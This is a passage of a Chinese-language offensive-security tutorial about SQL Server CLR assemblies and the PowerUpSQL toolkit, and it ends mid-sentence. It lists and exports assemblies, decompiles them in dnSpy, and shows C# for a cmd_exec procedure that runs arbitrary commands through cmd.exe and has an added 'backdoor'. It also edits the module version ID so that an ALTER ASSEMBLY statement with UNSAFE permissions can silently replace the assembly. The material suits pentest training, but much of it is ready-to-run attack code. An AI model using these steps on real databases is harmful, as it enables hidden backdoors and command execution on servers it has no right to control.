+CLR&nbsp;DLL:&nbsp;c:\temp\runcmd.dll
+SQL&nbsp;Cmd:&nbsp;c:\temp\runcmd.txt</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">以下是生成10个CLR DLL / CREATE ASSEMBLY SQL脚本的示例，在实验室中使用CLR组件时，可以派上用场。</span></p><pre class="brush:plain;toolbar:false">1..10|&nbsp;%{&nbsp;Create-SQLFileCLRDll&nbsp;-Verbose&nbsp;-ProcedureName&nbsp;myfile$_&nbsp;-OutDir&nbsp;c:\temp&nbsp;-OutFile&nbsp;myfile$_&nbsp;}</pre><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">如何列出现有的CLR程序集和CLR存储过程？</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">你可以使用下面的TSQL语句来查询验证你的CLR程序集是否正确设置，或者寻找现有的用户自定义的CLR程序集。</span></p><pre class="brush:plain;toolbar:false">USE&nbsp;msdb;
+SELECT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SCHEMA_NAME(so.[schema_id])&nbsp;AS&nbsp;[schema_name],&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;af.file_id,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;af.name&nbsp;+&nbsp;&#39;.dll&#39;&nbsp;as&nbsp;[file_name],
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;asmbly.clr_name,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;asmbly.assembly_id,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;asmbly.name&nbsp;AS&nbsp;[assembly_name],&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;am.assembly_class,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;am.assembly_method,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;so.object_id&nbsp;as&nbsp;[sp_object_id],
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;so.name&nbsp;AS&nbsp;[sp_name],
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;so.[type]&nbsp;as&nbsp;[sp_type],
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;asmbly.permission_set_desc,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;asmbly.create_date,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;asmbly.modify_date,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;af.content&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+FROM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.assembly_modules&nbsp;am
+INNER&nbsp;JOIN&nbsp;&nbsp;sys.assemblies&nbsp;asmbly
+ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;asmbly.assembly_id&nbsp;=&nbsp;am.assembly_id
+INNER&nbsp;JOIN&nbsp;&nbsp;sys.assembly_files&nbsp;af&nbsp;
+ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;asmbly.assembly_id&nbsp;=&nbsp;af.assembly_id&nbsp;
+INNER&nbsp;JOIN&nbsp;&nbsp;sys.objects&nbsp;so
+ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;so.[object_id]&nbsp;=&nbsp;am.[object_id]</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">使用这个查询我们可以看到文件名、程序集名、程序集类名、程序集方法和方法映射到的存储过程。</span></p><p style="text-align: center;"><img src="http://p7.qhimg.com/t012c95e33e8d615741.png" title="t01f11832051ad29c30.png" alt="http://p3.qhimg.com/t01f11832051ad29c30.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果你运行了我之前提供的“Create-SQLFileCLRDll”命令生成的10个TSQL查询，那么你应该在你的查询结果中看到“my_assembly”，你还将看到这些程序集相关的程序集信息。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">PowerUpSQL自动化</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我在PowerUpSQL中添加了一个名为“Get-SQLStoredProcedureCLR”的功能，它将迭代可访问的数据库，并提供每个数据库的程序集信息。 以下是一个命令示例：</span></p><pre class="brush:plain;toolbar:false">Get-SQLStoredProcedureCLR&nbsp;-Verbose&nbsp;-Instance&nbsp;MSSQLSRV04\SQLSERVER2014&nbsp;-Username&nbsp;sa&nbsp;-Password&nbsp;&#39;sapassword!&#39;&nbsp;|&nbsp;Out-GridView</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">你还可以使用以下命令对所有域内的SQL Server执行此操作（前提是你拥有正确的权限）。</span></p><pre class="brush:plain;toolbar:false">Get-SQLInstanceDomain&nbsp;-Verbose&nbsp;|&nbsp;Get-SQLStoredProcedureCLR&nbsp;-Verbose&nbsp;-Instance&nbsp;MSSQLSRV04\SQLSERVER2014&nbsp;-Username&nbsp;sa&nbsp;-Password&nbsp;&#39;sapassword!&#39;&nbsp;|&nbsp;Format-Table&nbsp;-AutoSize</pre><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">映射程序参数</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">攻击者不是唯一创建不安全程序集的人员。有时候开发人员会创建执行OS命令或者与操作系统进行资源交互的程序集。因此，定位和逆向这些程序集也是很有必要的，有时这些程序集会有权限提升的bug。例如，如果我们的程序集已经存在，我们可以尝试去确定一下它接受的参数和怎么使用它们。只是为了好玩，让我们使用下面的TSQL查询“cmd_exec”存储过程接受了哪些参数</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></p><pre class="brush:plain;toolbar:false">SELECT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr.name&nbsp;as&nbsp;procname,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pa.name&nbsp;as&nbsp;param_name,&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TYPE_NAME(system_type_id)&nbsp;as&nbsp;Type,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pa.max_length,&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pa.has_default_value,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pa.is_nullable&nbsp;
+FROM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.all_parameters&nbsp;paINNER&nbsp;JOIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.procedures&nbsp;pr&nbsp;on&nbsp;pa.object_id&nbsp;=&nbsp;pr.object_idWHERE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr.type&nbsp;like&nbsp;&#39;pc&#39;&nbsp;and&nbsp;pr.name&nbsp;like&nbsp;&#39;cmd_exec&#39;</pre><p style="text-align: center;"><img src="http://p7.qhimg.com/t010e62147bc07f785f.png" title="t01fd8c5bdc0b41f28c.png" alt="http://p4.qhimg.com/t01fd8c5bdc0b41f28c.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在这个例子中，我们可以看到它只接受一个名为“execCommand”的字符串参数。 针对存储过程的攻击者可能能够确定它可以用于执行OS命令。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">如何将SQL Server中存在的CLR程序集导出到DLL？</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在SqlServer中，我们还可以将用户定义的CLR程序集导出到dll。我们来谈谈从识别CLR程序集到获取CLR的源代码。首先，我们必须识别程序集，然后将它们导出到dll，并且对它们进行反编译以便进行源码分析（或修改为注入后门程序）。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">PowerUpSQL自动化</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在上面我们讨论了如何使用下面的PowerUpSQL命令列出CLR程序集。</span></p><pre class="brush:plain;toolbar:false">Get-SQLStoredProcedureCLR&nbsp;-Verbose&nbsp;-Instance&nbsp;MSSQLSRV04\SQLSERVER2014&nbsp;-Username&nbsp;sa&nbsp;-Password&nbsp;&#39;sapassword!&#39;&nbsp;|&nbsp;Format-Table&nbsp;-AutoSize</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">它存在一个“ExportFolder”选项，我们可以设置它，这个功能将会把程序集dll导出到文件夹，以下是一个命令示例：</span></p><pre class="brush:plain;toolbar:false">Get-SQLStoredProcedureCLR&nbsp;-Verbose&nbsp;-Instance&nbsp;MSSQLSRV04\SQLSERVER2014&nbsp;-ExportFolder&nbsp;c:\temp&nbsp;&nbsp;-Username&nbsp;sa&nbsp;-Password&nbsp;&#39;sapassword!&#39;&nbsp;|&nbsp;Format-Table&nbsp;-AutoSize</pre><p style="text-indent: 2em;"><br/></p><p style="text-align: center;"><img src="http://p1.qhimg.com/t018e2b72307e4f730d.png" title="t013c1fde7d3d951645.png" alt="http://p2.qhimg.com/t013c1fde7d3d951645.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果你是域用户，并且权限是sysadmin，还可以使用下面的命令导出CLR DLL</span></p><pre class="brush:plain;toolbar:false">Get-SQLInstanceDomain&nbsp;-Verbose&nbsp;|&nbsp;Get-SQLStoredProcedureCLR&nbsp;-Verbose&nbsp;-Instance&nbsp;MSSQLSRV04\SQLSERVER2014&nbsp;-Username&nbsp;sa&nbsp;-Password&nbsp;&#39;sapassword!&#39;&nbsp;-ExportFolder&nbsp;c:\temp&nbsp;|&nbsp;Format-Table&nbsp;-AutoSize</pre><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Dll可以在输出的文件夹中找到。脚本将基于每个服务器的名称、实例和数据库的名称动态构建文件夹结构。</span><img src="http://p5.qhimg.com/t01000fe3b320f483c6.png" title="t014ace1c6cbe1e57b4.png" alt="http://p5.qhimg.com/t014ace1c6cbe1e57b4.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后你可以使用你喜欢的反编译器查看源代码。在过去一年中，我已经成为dnSpy的粉丝。阅读后面的内容你将知道这是因为什么。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"><br/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">如何修改CLR DLL并覆盖已经导入SQL Server的程序集？</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">以下简要介绍如何使用dnSpy反编译、查看、编辑、保存、和重新导入现有的SQL Server CLR DLL,你可以在这里下载</span><a href="https://github.com/0xd4d/dnSpy/releases" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">dnSpy</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">本次练习我们将修改从SQL Server导出的cmd_exec.dll</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.在dnSpy中打开cmd_exec.dll文件。在左侧面板中，向下选择，直到找到“cmd_exec”方法并选择它，你可以立马看到它的源码并寻找bug。<br/></span></p><p style="text-align: center;"><img src="http://p7.qhimg.com/t01a8fe1a816378dbbf.png" title="t0108bb2d3be6479f81.png" alt="http://p6.qhimg.com/t0108bb2d3be6479f81.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.接下来，右键单击包含源代码的右侧面板，然后选择“Edit Method (C#)&nbsp;...”</span><br/></p><p style="text-align: center;"><img src="http://p7.qhimg.com/t01ac636401b6977c44.png" title="t0182c5f88ca9298604.png" alt="http://p5.qhimg.com/t0182c5f88ca9298604.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.编辑你想编辑的代码，在这个例子中，我添加了一个简单的“后门”，每次调用“cmd_exec”方法时，都会向“C:\temp”目录中添加文件。示例代码和屏幕截图如下。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">public&nbsp;static&nbsp;void&nbsp;cmd_exec(SqlString&nbsp;execCommand){
+&nbsp;&nbsp;&nbsp;&nbsp;Process&nbsp;expr_05&nbsp;=&nbsp;new&nbsp;Process();
+&nbsp;&nbsp;&nbsp;&nbsp;expr_05.StartInfo.FileName&nbsp;=&nbsp;&quot;C:\\Windows\\System32\\cmd.exe&quot;;
+&nbsp;&nbsp;&nbsp;&nbsp;expr_05.StartInfo.Arguments&nbsp;=&nbsp;string.Format(&quot;&nbsp;/C&nbsp;{0}&quot;,&nbsp;execCommand.Value);
+&nbsp;&nbsp;&nbsp;&nbsp;expr_05.StartInfo.UseShellExecute&nbsp;=&nbsp;true;
+&nbsp;&nbsp;&nbsp;&nbsp;expr_05.Start();
+&nbsp;&nbsp;&nbsp;&nbsp;expr_05.WaitForExit();
+&nbsp;&nbsp;&nbsp;&nbsp;expr_05.Close();
+&nbsp;&nbsp;&nbsp;&nbsp;Process&nbsp;expr_54&nbsp;=&nbsp;new&nbsp;Process();
+&nbsp;&nbsp;&nbsp;&nbsp;expr_54.StartInfo.FileName&nbsp;=&nbsp;&quot;C:\\Windows\\System32\\cmd.exe&quot;;
+&nbsp;&nbsp;&nbsp;&nbsp;expr_54.StartInfo.Arguments&nbsp;=&nbsp;string.Format(&quot;&nbsp;/C&nbsp;&#39;whoami&nbsp;&gt;&nbsp;c:\\temp\\clr_backdoor.txt&quot;,&nbsp;execCommand.Value);
+&nbsp;&nbsp;&nbsp;&nbsp;expr_54.StartInfo.UseShellExecute&nbsp;=&nbsp;true;
+&nbsp;&nbsp;&nbsp;&nbsp;expr_54.Start();
+&nbsp;&nbsp;&nbsp;&nbsp;expr_54.WaitForExit();
+&nbsp;&nbsp;&nbsp;&nbsp;expr_54.Close();
+}</pre><p style="text-align: center;"><img src="http://p8.qhimg.com/t01befe1853f407906f.png" title="t016501e12bb33c82ca.png" alt="http://p1.qhimg.com/t016501e12bb33c82ca.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.通过单击编译按钮保存修补的代码。然后从顶部菜单选择File、Save Module....然后点击确定</span></p><p style="text-align: center;"><img src="http://p3.qhimg.com/t01dce3ab2c491625b1.png" title="t0178865751334b3479.png" alt="http://p9.qhimg.com/t0178865751334b3479.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">根据这篇</span><a href="https://msdn.microsoft.com/en-us/library/system.reflection.module.moduleversionid.aspx" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Microsoft</a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">的文章，在每次编译CLR时，都会生成一个唯一的GUID并将其嵌入到文件头中，以便用来区分同一文件的两个版本。这被称为MVID（模块版本ID）。要覆盖已经导入到SQLServer的现有CLR，我们必须手动修改MVID。以下是一个概述。</span><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.在dnSpy中打开“cmd_exec”,如果它还没有被打开，向下选择PE部分并选择“#GUID”存储流。然后右键单击它，然后选择“Show Data in Hex Editor”。</span></p><p style="text-align: center;"><img src="http://p2.qhimg.com/t01c0686fa3610ac685.png" title="t0186bd68a17e6f00f5.png" alt="http://p1.qhimg.com/t0186bd68a17e6f00f5.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.接下来，我们需要用任意值修改所选字节之一</span></p><p style="text-align: center;"><img src="http://p2.qhimg.com/t0112b6f54c508ef4a0.png" title="t01af385db0707da720.png" alt="http://p7.qhimg.com/t01af385db0707da720.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.从顶部菜单中选择文件，然后选择“Save Module...”</span></p><p style="text-align: center;"><img src="http://p1.qhimg.com/t0197d78e7dba7452eb.png" title="t0120d15a1bd57657c0.png" alt="http://p0.qhimg.com/t0120d15a1bd57657c0.png"/></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">PowerShell自动化</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">你可以使用我之前提供的原始PowerShell命令，也可以使用下面的PowerUPSQL命令从新修改的“cmd_exec.dll”文件获取十六进制字节，并生成ALTER语句。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;C:\temp&gt;&nbsp;Create-SQLFileCLRDll&nbsp;-Verbose&nbsp;-SourceDllPath&nbsp;.\cmd_exec.dll
+VERBOSE:&nbsp;Target&nbsp;C#&nbsp;&nbsp;File:&nbsp;NA
+VERBOSE:&nbsp;Target&nbsp;DLL&nbsp;File:&nbsp;.\cmd_exec.dll
+VERBOSE:&nbsp;Grabbing&nbsp;bytes&nbsp;from&nbsp;the&nbsp;dll
+VERBOSE:&nbsp;Writing&nbsp;SQL&nbsp;to:&nbsp;C:\Users\SSUTHE~1\AppData\Local\Temp\CLRFile.txt
+C#&nbsp;File:&nbsp;NA
+CLR&nbsp;DLL:&nbsp;.\cmd_exec.dll
+SQL&nbsp;Cmd:&nbsp;C:\Users\SSUTHE~1\AppData\Local\Temp\CLRFile.txt</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">新的cmd_exec.txt&nbsp;内容看起来应该像下面的语句</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">--&nbsp;Choose&nbsp;the&nbsp;msdb&nbsp;database
+use&nbsp;msdb
+--&nbsp;Alter&nbsp;the&nbsp;existing&nbsp;CLR&nbsp;assembly
+ALTER&nbsp;ASSEMBLY&nbsp;[my_assembly]&nbsp;FROM&nbsp;
+0x4D5A90000300000004000000F[TRUNCATED]
+WITH&nbsp;PERMISSION_SET&nbsp;=&nbsp;UNSAFE&nbsp;
+GO</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ALTER语句用于替换现有的CLR而不是DROP和CREATE。&nbsp;正如微软所说的那样：“ALTER ASSEMBLY不会中断正在修改的程序集中当前会话里正在运行的代码。当前会话通过使用程序集的未更改位来完成执行。&nbsp;所以，总而言之，什么都没有发生。&nbsp;TSQL查询执行应该看起来像下面的截图:</span></p><p style="text-align: center;"><img src="http://p9.qhimg.com/t01f9b57c87c118e640.png" title="t017ce4a1c8ded79364.png" alt="http://p3.qhimg.com/t017ce4a1c8ded79364.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">要检查代码修改是否有效，请运行“cmd_exec”存储过程，并验证是否已创建“C:\temp\backdoor.txt”文件。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我可以使用自定义CLR升级SQL Server中的权限吗？</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">答案是肯定的，但有一些苛刻的条件必须要满足。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果你的SQL Server不是以sysadmin登录的，但具有CREATE或ALTER 